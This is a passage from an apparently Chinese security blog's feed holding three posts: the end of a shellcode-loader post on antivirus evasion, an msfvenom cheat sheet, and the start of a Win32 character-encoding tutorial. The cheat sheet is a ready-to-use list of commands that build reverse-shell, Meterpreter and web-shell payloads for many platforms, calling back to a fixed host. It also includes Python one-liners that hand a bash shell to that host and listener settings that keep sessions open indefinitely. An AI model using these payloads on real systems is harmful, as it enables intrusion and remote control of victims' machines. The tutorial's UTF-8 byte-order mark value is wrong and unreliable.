class="string">&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">➜  ~ msfvenom -p windows/exec cmd=calc.exe -f c --bad <span class="string">&quot;\x00&quot;</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found <span class="number">11</span> compatible encoders</span><br><span class="line">Attempting to encode payload with <span class="number">1</span> iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size <span class="number">220</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x86/shikata_ga_nai chosen with <span class="keyword">final</span> size <span class="number">220</span></span><br><span class="line">Payload size: <span class="number">220</span> bytes</span><br><span class="line">Final size of c file: <span class="number">949</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xbe\x7a\x1b\x33\xc4\xd9\xc9\xd9\x74\x24\xf4\x5f\x31\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\x83\xef\xfc\x31\x77\x0f\x03\x77\x75\xf9\xc6\x38\x61\x7f&quot;</span></span><br><span class="line"><span class="string">&quot;\x28\xc1\x71\xe0\xa0\x24\x40\x20\xd6\x2d\xf2\x90\x9c\x60\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\x5b\xf0\x90\x75\x29\xdd\x97\x3e\x84\x3b\x99\xbf\xb5\x78\xb8&quot;</span></span><br><span class="line"><span class="string">&quot;\x43\xc4\xac\x1a\x7a\x07\xa1\x5b\xbb\x7a\x48\x09\x14\xf0\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xbe\x11\x4c\x3c\x34\x69\x40\x44\xa9\x39\x63\x65\x7c\x32\x3a&quot;</span></span><br><span class="line"><span class="string">&quot;\xa5\x7e\x97\x36\xec\x98\xf4\x73\xa6\x13\xce\x08\x39\xf2\x1f&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\x96\x3b\x90\x03\xe6\x7c\x16\xfc\x9d\x74\x65\x81\xa5\x42&quot;</span></span><br><span class="line"><span class="string">&quot;\x14\x5d\x23\x51\xbe\x16\x93\xbd\x3f\xfa\x42\x35\x33\xb7\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x57\x46\xc5\x29\x63\xc3\xe8\xfd\xe2\x97\xce\xd9\xaf\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x6e\x7b\x15\x22\x8f\x9b\xf6\x9b\x35\xd7\x1a\xcf\x47\xba\x70&quot;</span></span><br><span class="line"><span class="string">&quot;\x0e\xd5\xc0\x36\x10\xe5\xca\x66\x79\xd4\x41\xe9\xfe\xe9\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\x4e\xf0\xa3\x8e\xe6\x99\x6d\x5b\xbb\xc7\x8d\xb1\xff\xf1\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x7f\x06\x0d\x31\x7a\x42\x89\xa9\xf6\xdb\x7c\xce\xa5\xdc&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\xad\x28\x4f\x34\x1c\xcf\xf7\xdf\x60&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="位-1">64位</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfvenom -p windows/x64/exec cmd=calc.exe -f c --bad <span class="string">&quot;\x00&quot;</span>               </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">Found <span class="number">3</span> compatible encoders</span><br><span class="line">Attempting to encode payload with <span class="number">1</span> iterations of generic/none</span><br><span class="line">generic/none failed with Encoding failed due to a bad character (index=<span class="number">7</span>, <span class="keyword">char</span>=<span class="number">0x00</span>)</span><br><span class="line">Attempting to encode payload with <span class="number">1</span> iterations of x64/<span class="keyword">xor</span></span><br><span class="line">x64/<span class="keyword">xor</span> succeeded with size <span class="number">319</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x64/<span class="keyword">xor</span> chosen with <span class="keyword">final</span> size <span class="number">319</span></span><br><span class="line">Payload size: <span class="number">319</span> bytes</span><br><span class="line">Final size of c file: <span class="number">1366</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\x48\xbb\xf5\x1f\xb6\x9f\x1f\x80\x55\xcb\x48\x31\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x09\x57\x35\x7b\xef\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\xcb\xf5\x1f\xf7\xce\x5e\xd0\x07\x9a\xa3\x57\x87\x4d\x7a&quot;</span></span><br><span class="line"><span class="string">&quot;\xc8\xde\x99\x95\x57\x3d\xcd\x07\xc8\xde\x99\xd5\x57\x3d\xed&quot;</span></span><br><span class="line"><span class="string">&quot;\x4f\xc8\x5a\x7c\xbf\x55\xfb\xae\xd6\xc8\x64\x0b\x59\x23\xd7&quot;</span></span><br><span class="line"><span class="string">&quot;\xe3\x1d\xac\x75\x8a\x34\xd6\xbb\xde\x1e\x41\xb7\x26\xa7\x5e&quot;</span></span><br><span class="line"><span class="string">&quot;\xe7\xd7\x94\xd2\x75\x40\xb7\x23\xfe\x9e\xcf\x0b\xd5\x43\xf5&quot;</span></span><br><span class="line"><span class="string">&quot;\x1f\xb6\xd7\x9a\x40\x21\xac\xbd\x1e\x66\xcf\x94\xc8\x4d\x8f&quot;</span></span><br><span class="line"><span class="string">&quot;\x7e\x5f\x96\xd6\x1e\x50\xb6\x9d\xbd\xe0\x7f\xde\x94\xb4\xdd&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xf4\xc9\xfb\xae\xd6\xc8\x64\x0b\x59\x5e\x77\x56\x12\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\x0a\xcd\xff\xc3\x6e\x53\x83\x19\xef\xfd\x5a\x8f\x4e\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x0d\x8f\x7e\x5f\x92\xd6\x1e\x50\x33\x8a\x7e\x13\xfe\xdb&quot;</span></span><br><span class="line"><span class="string">&quot;\x94\xc0\x49\x82\xf4\xcf\xf7\x14\x1b\x08\x1d\xca\x25\x5e\xee&quot;</span></span><br><span class="line"><span class="string">&quot;\xde\x47\xde\x0c\x91\xb4\x47\xf7\xc6\x5e\xda\x1d\x48\x19\x3f&quot;</span></span><br><span class="line"><span class="string">&quot;\xf7\xcd\xe0\x60\x0d\x8a\xac\x45\xfe\x14\x0d\x69\x02\x34\x0a&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\xeb\xd7\xa5\x81\x55\xcb\xf5\x1f\xb6\x9f\x1f\xc8\xd8\x46&quot;</span></span><br><span class="line"><span class="string">&quot;\xf4\x1e\xb6\x9f\x5e\x3a\x64\x40\x9a\x98\x49\x4a\xa4\x70\xe0&quot;</span></span><br><span class="line"><span class="string">&quot;\x69\xa3\x5e\x0c\x39\x8a\x3d\xc8\x34\x20\x57\x35\x5b\x37\xbc&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xb7\xff\x9f\x4d\x7f\x6a\x85\xee\x8c\xe6\x6d\xd9\xf5\x1f&quot;</span></span><br><span class="line"><span class="string">&quot;\xd9\x14\x42\x2f\xe0\x63\xfc\x7e\xec\x36\xe5\x90\x67\xd3\x9f&quot;</span></span><br><span class="line"><span class="string">&quot;\x1f\x80\x55\xcb&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="vscode与visual-studio">vscode与Visual Studio</h1><p>经过测试，我这里的vscode无论是32位的指针执行还是动态分配执行都是可以正常弹calc的；但是64位的指针执行还是动态分配执行都不可以执行，应该是vscode的环境问题。</p><p>而在Visual Studio中，32位下，动态分配的方式可以正常执行，但是如果是想要指针执行，则需要关闭DEP：</p><figure><img src="/2022/04/08/ShellCodeLoader/image-20220408231623763.png" alt="image-20220408231623763"><figcaption aria-hidden="true">image-20220408231623763</figcaption></figure><p>64位下，动态分配可以正常运行，但是指针执行无论如何都没有成功，找了半天解决办法仍未成功，64位程序无法关闭DEP。</p><p>之后找到解决办法再写吧，占个坑位，有大佬如果知道的QQ联系QAQ.</p><blockquote><p>https://422926799.github.io/posts/44310b89.html</p><p>https://www.redteam101.tech/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis</p><p>https://wooyun.js.org/drops/Exploit%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-Windows%E5%9F%BA%E7%A1%80&amp;shellcode.html</p><p>https://luckyfuture.top/ShellcodeLoader.html</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录一些语言的shellcode 加载方式，持续更新...&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;cc&quot;&gt;C/C++&lt;/h1&gt;
&lt;p&gt;首先是c的loader，分两种，指针直接执行和动态分配。&lt;/p&gt;
&lt;h2 id=&quot;指针执行&quot;&gt;指针执行&lt;/h2&gt;
&lt;f</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="免杀" scheme="https://ghostasky.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>msfvenom参数详解</title>
    <link href="https://ghostasky.github.io/2022/04/07/msfvenom%E8%AF%A6%E8%A7%A3/"/>
    <id>https://ghostasky.github.io/2022/04/07/msfvenom%E8%AF%A6%E8%A7%A3/</id>
    <published>2022-04-06T16:00:00.000Z</published>
    <updated>2022-07-12T06:27:01.871Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="常规参数">常规参数</h1><p>所有参数</p><figure><img src="/2022/04/07/msfvenom%E8%AF%A6%E8%A7%A3/image-20220407184834893.png" alt="image-20220407184834893"><figcaption aria-hidden="true">image-20220407184834893</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</span><br><span class="line">-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, platforms, archs, encrypt, formats, all</span><br><span class="line"></span><br><span class="line">-n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, –encoder [encoder] 指定需要使用的encoder（编码器）,指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload</span><br><span class="line">-a, –arch &lt; architecture&gt; 指定payload的目标架构，例如x86 | x64 | x86_64</span><br><span class="line">–platform &lt; platform&gt; 指定payload的目标平台</span><br><span class="line">-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小</span><br><span class="line">-b, –bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符例如：不使用 &#x27;\x0f&#x27;、&#x27;\x00&#x27;;</span><br><span class="line">-i, –iterations &lt; count&gt; 指定payload的编码次数</span><br><span class="line">-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件</span><br><span class="line">-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中</span><br><span class="line">-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">–payload-options 列举payload的标准选项</span><br><span class="line">-o, –out &lt; path&gt; 指定创建好的payload的存放位置</span><br><span class="line">-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式</span><br><span class="line">–shellest 最小化生成payload</span><br><span class="line">-h, –help 查看帮助选项</span><br><span class="line">–help-formats 查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure><p>查看所有payload：<code>msfvenom --list payloads</code>(其他的模块也一样)</p><p>查看所有编码器：<code>msfvenom --list encoders</code></p><figure><img src="/2022/04/07/msfvenom%E8%AF%A6%E8%A7%A3/image-20220407185452945.png" alt="image-20220407185452945"><figcaption aria-hidden="true">image-20220407185452945</figcaption></figure><p>其中有两个excellent，<code>cmd/powershell_base64</code>和<code>x86/shikata_ga_nai</code></p><p>查看某个payload支持那些平台、选项等(使用windows/meterpreter/reverse_tcp举例)：</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp --list-options</code></p><h1 id="重要的监听参数">重要的监听参数</h1><h2 id="防止假session">防止假session</h2><p>在实战中，经常会遇到假session或者刚连接就断开的情况，这里补充一些监听参数，防止假死与假session</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; set ExitOnSession false   //可以在接收到seesion后继续监听端口，保持侦听。</span><br></pre></td></tr></table></figure><h2 id="防止session意外退出">防止session意外退出</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> SessionCommunicationTimeout 0  </span><br><span class="line">//默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> SessionExpirationTimeout 0 </span><br><span class="line">//默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭</span><br></pre></td></tr></table></figure><h2 id="handler后台持续监听">handler后台持续监听</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit -j -z</span><br></pre></td></tr></table></figure><p>使用exploit -j -z可在后台持续监听,-j为后台任务，-z为成功后不主动发送stage(感谢Green-m大佬指正)，使用Jobs命令查看和管理后台任务。jobs -K可结束所有任务。</p><p>还有种比较快捷的建立监听的方式，在msf下直接执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -H 10.211.55.2 -P 3333 -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><h1 id="一些payload">一些payload</h1><h2 id="windows">windows</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f exe &gt; shell.exe</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><h2 id="linux">linux</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><h2 id="mac">mac</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform osx -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure><h2 id="android">Android</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.apk</span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 R &gt; test.apk</span><br></pre></td></tr></table></figure><h2 id="powershell">Powershell</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1</span><br></pre></td></tr></table></figure><h2 id="shellcode">shellcode</h2><h3 id="linux-1">linux</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f c</span><br></pre></td></tr></table></figure><h3 id="windows-1">Windows</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f c</span><br></pre></td></tr></table></figure><h3 id="mac-1">Mac</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform osx -f c</span><br></pre></td></tr></table></figure><h2 id="脚本">脚本</h2><h3 id="python反弹shell">python反弹shell</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.py</span><br><span class="line">msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><h3 id="python正向shell">python正向shell</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python/python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.211.55.2&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line">python/python3 -c <span class="string">&quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&quot;</span>10.211.55.2<span class="string">&quot;,3333))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span></span><br></pre></td></tr></table></figure><h3 id="bash">bash</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure><h3 id="perl">perl</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><h3 id="lua">Lua</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_lua LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.lua</span><br></pre></td></tr></table></figure><h3 id="ruby">Ruby</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.rb</span><br></pre></td></tr></table></figure><h2 id="web">Web</h2><h3 id="php">PHP</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><h3 id="aspx">Aspx</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f aspx -o shell.aspx</span><br></pre></td></tr></table></figure><h3 id="asp">asp</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><h3 id="jsp">Jsp</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><h3 id="war">war</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f war &gt; shell.war</span><br></pre></td></tr></table></figure><h3 id="nodejs">nodejs</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.js</span><br></pre></td></tr></table></figure><p>弹计算器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --payload windows/<span class="built_in">exec</span> cmd=<span class="string">&quot;calc&quot;</span> --format exe --out a.exe --arch x86 --platform windows --bad <span class="string">&quot;\x00&quot;</span> --smallest</span><br><span class="line">msfvenom --payload windows/<span class="built_in">exec</span> cmd=<span class="string">&quot;calc&quot;</span> --format c --arch x86 --platform windows --bad <span class="string">&quot;\x00&quot;</span> </span><br></pre></td></tr></table></figure><p>来源</p><blockquote><p>https://www.yuque.com/tidesec/bypassav/e5bb94c4b1a643fa8d1ce5d505d12c84</p><p>https://buaq.net/go-954.html</p><p>https://wohin.me/0dayan-quan-chapter-4-yong-metasploitkai-fa-exploit/#-msfvenom-shellcode</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;常规参数&quot;&gt;常规参数&lt;/h1&gt;
&lt;p&gt;所有参数&lt;/p&gt;
&lt;figure&gt;
&lt;img src=&quot;/2022/04/07/msfvenom%E8%AF%A6%E8%A7%A3/image-20220407184834893.png&quot; </summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="免杀" scheme="https://ghostasky.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>重拾Win32</title>
    <link href="https://ghostasky.github.io/2022/04/01/%E9%87%8D%E6%8B%BEWin32/"/>
    <id>https://ghostasky.github.io/2022/04/01/%E9%87%8D%E6%8B%BEWin32/</id>
    <published>2022-03-31T16:00:00.000Z</published>
    <updated>2022-07-12T06:23:14.622Z</updated>
    
    <content type="html"><![CDATA[<p>之后想看看免杀和内核相关的东西，先把win32再看一遍吧，好多都忘了，还是滴水的课程，感谢海哥的课程！</p><p>[toc]</p><h1 id="介绍">介绍</h1><p>Win32不是用来画界面的，如果你以后要在Windows写好程序，是必须要学Win32的；</p><h1 id="字符编码">字符编码</h1><h2 id="ascii">ASCII</h2><p>使用指定的7 位二进制数组合来表示128种可能的字符。</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401175832925.png"></p><p>最大为<code>0x7F</code></p><h3 id="扩展ascii表">扩展ASCII表</h3><p>从<code>0x80</code> 到<code>0xFF</code>：（未截全）</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401180412423.png" alt="image-20220401180412423"><figcaption aria-hidden="true">image-20220401180412423</figcaption></figure><p>对于中文韩文日文等还是不够。</p><h2 id="ascii表的扩展">ASCII表的扩展</h2><p>GB2312/GB2312-80，与GBK差不多的。</p><p>（GB2312标准共收录 6763个汉字，GBK共收入21886个汉字和图形符号）</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401181028760.png" alt="image-20220401181028760"><figcaption aria-hidden="true">image-20220401181028760</figcaption></figure><p>每一个都是扩展ASCII。</p><p>假设我们将“中国”这两个字发给国外的朋友，他的电脑上并没有该编码表，所以解析出 来的则不会是汉字，而会出现大家所熟知的“乱码”</p><h2 id="unicode">Unicode</h2><p>Unicode编码创建了一张包含世界上所有文字的编码表，只要世界上存在的文字符号，都会赋予 一个唯一的编码</p><p>Unicode编码的范围是：0x0-0x10FFFF，其可以容纳100多万个符号</p><h3 id="存储方式">存储方式</h3><h4 id="utf-16">UTF-16</h4><p>UTF-16/UTF-8是Unicode存储的实现方式；<strong>UTF-16编码是以16个无符号整数位单位</strong>，注意是16位为一个单位， 但不表示一个字符就只有16位，具体的要看字符的Unicode编码所在范围，有可能是2字节，有可能是4字节， <strong>现在机器上的Unicode编码一般指的就是UTF-16</strong>。</p><p>会有le与be两种，就是存储方式为大端序和小端序。</p><p>举例（假的）：</p><ul><li>中（Unicode编码）：0x1234</li><li>国（Unicode编码）：0x12345</li></ul><p>存储的时候，中占2字节，国占4字节（0x0001 2345）</p><p>如‘中’和‘A’的存储</p><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401182412900.png" alt="image-20220401182412900"><figcaption aria-hidden="true">image-20220401182412900</figcaption></figure><p>比较浪费，于是有了utf8</p><h4 id="utf-8">UTF-8</h4><p>UTF-8称之为可<strong>变长存储</strong>方案，其存储根据字符大小来分配，例如字母A就分配一个字节，汉字“中”就分配两个 字节。</p><p>优点：节省空间；缺点：解析很麻烦</p><h4 id="bom">BOM</h4><p>BOM中文为字节顺序标记，其就是用来插入到文本文件起始位置开头的，用于识别Unicode文件的编码类型。</p><p>上面的截图，有<code>FFFE</code>之类的东西，那个就是。</p><table><thead><tr class="header"><th>utf8</th><th>EF EB BF</th></tr></thead><tbody><tr class="odd"><td>UTF-16LE(LITTLE)</td><td>FF FE</td></tr><tr class="even"><td>UTF-16BE(BIG)</td><td>FE FF</td></tr></tbody></table><figure><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220401183005344.png" alt="image-20220401183005344"><figcaption aria-hidden="true">image-20220401183005344</figcaption></figure><h1 id="c语言中的宽字符">C语言中的宽字符</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ASCII码：<span class="keyword">char</span> strBuff[] = <span class="string">&quot;中国&quot;</span>;</span><br><span class="line">Unicode编码（UTF<span class="number">-16</span>）：<span class="keyword">wchar_t</span> strBuff[] = <span class="string">L&quot;中国&quot;</span></span><br></pre></td></tr></table></figure><p>字符串长度：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> strBuff[] = <span class="string">&quot;China&quot;</span>;</span><br><span class="line"><span class="keyword">wchar_t</span> strBuff1[] = <span class="string">L&quot;China&quot;</span>;</span><br><span class="line"><span class="built_in">strlen</span>(strBuff); <span class="comment">//取得多字节字符串中字符长度，不包含 00</span></span><br><span class="line">wcslen(strBuff1); <span class="comment">//取得多字节字符串中字符长度，不包含 00 